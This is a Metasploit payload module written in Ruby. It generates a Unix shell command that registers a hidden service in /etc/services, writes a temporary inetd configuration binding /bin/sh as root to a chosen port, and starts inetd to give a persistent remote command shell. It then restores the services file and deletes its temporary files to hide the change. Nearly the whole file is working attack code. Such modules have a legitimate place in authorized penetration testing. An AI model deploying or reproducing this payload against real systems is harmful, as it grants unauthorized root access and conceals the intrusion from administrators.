##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 487

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Bind TCP (inetd)',
        'Description' => 'Listen for a connection and spawn a command shell (persistent)',
        'Author' => 'hdm',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'Privileged' => true,
        'RequiredCmd' => 'inetd',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_advanced_options(
      [
        OptString.new('InetdPath', [true, 'The path to the inetd executable', 'inetd']),
        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    tmp_services = '/tmp/.' + Rex::Text.rand_text_alpha(32)
    tmp_inet = '/tmp/.' + Rex::Text.rand_text_alpha(32)
    svc = Rex::Text.rand_text_alpha_lower(9)

    cmd =
      # Create a clean copy of the services file
      "cp /etc/services #{tmp_services};" +

      # Add our service to the system one
      "echo #{svc} #{datastore['LPORT']}/tcp>>/etc/services;" +

      # Create our inetd configuration file with our service
      "echo #{svc} stream tcp nowait root #{datastore['ShellPath']} sh>#{tmp_inet};" +

      # First we try executing inetd without the full path
      "#{datastore['InetdPath']} -s #{tmp_inet} ||" +

      # Next try the standard inetd path on Linux, Solaris, BSD
      "/usr/sbin/inetd -s #{tmp_inet} ||" +

      # Next try the Irix inetd path
      "/usr/etc/inetd -s #{tmp_inet};" +

      # Overwrite services with the "clean" version
      "cp #{tmp_services} /etc/services;" +

      # Delete our configuration file
      "rm #{tmp_inet} #{tmp_services};"

    return cmd
  end
end
